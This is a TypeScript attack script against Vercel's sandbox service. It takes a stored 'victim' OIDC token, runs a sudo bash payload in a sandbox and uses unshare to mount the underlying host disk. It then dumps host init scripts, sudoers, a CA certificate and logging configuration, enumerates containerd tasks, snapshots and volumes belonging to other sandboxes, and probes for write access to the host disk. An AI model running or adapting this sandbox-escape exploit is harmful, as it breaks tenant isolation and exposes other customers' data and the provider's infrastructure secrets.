import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
mkdir -p /mnt/vda2
mount -t xfs /dev/vda /mnt/vda2 2>/dev/null
R=/mnt/vda2
echo "===== celld-init.sh ====="; cat $R/opt/vercel/celld-init.sh 2>&1
echo; echo "===== celld-exit-hook.sh ====="; cat $R/opt/vercel/celld-exit-hook.sh 2>&1
echo; echo "===== apply-variables-vector.sh ====="; cat $R/opt/vercel/apply-variables-vector.sh 2>&1
echo; echo "===== sudoers.d/vercel ====="; cat $R/etc/sudoers.d/vercel 2>&1
echo; echo "===== /run/cell/ca-cert.pem ====="; cat $R/run/cell/ca-cert.pem 2>&1
echo; echo "===== containerd runtime tasks (running sandboxes?) ====="
ls -la $R/var/lib/containerd/io.containerd.runtime.v2.task/ 2>&1
find $R/var/lib/containerd/io.containerd.runtime.v2.task -maxdepth 3 2>/dev/null | head -40
echo "===== snapshots ====="
ls -la $R/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/ 2>&1
find $R/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots -maxdepth 2 -type d 2>/dev/null | head -30
echo "===== erofs snapshotter ====="
ls -laR $R/var/lib/containerd/io.containerd.snapshotter.v1.erofs/ 2>&1 | head -30
echo "===== vector config ====="
ls -la $R/etc/vector 2>&1; cat $R/etc/vector/vector.yaml 2>&1 | head -60
cat $R/etc/vector/*.toml 2>&1 | head -40
echo "===== test WRITE access to host disk ====="
touch $R/.write_test_probe_$(date +%s) 2>&1 && echo WRITE_OK || echo WRITE_FAIL
ls -la $R/.write_test_probe_* 2>&1
rm -f $R/.write_test_probe_* 2>&1 && echo CLEANED
echo "===== celld binary info ====="
file $R/opt/vercel/celld 2>&1
sha256sum $R/opt/vercel/celld 2>&1
ls -la $R/opt/vercel/celld
echo "===== journal dir size ====="
du -sh $R/var/log/journal 2>&1
echo "===== check for other cell rootfs data (volumes) ====="
find $R/volumes -maxdepth 4 2>/dev/null | head -40
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore3.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore3.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 180_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });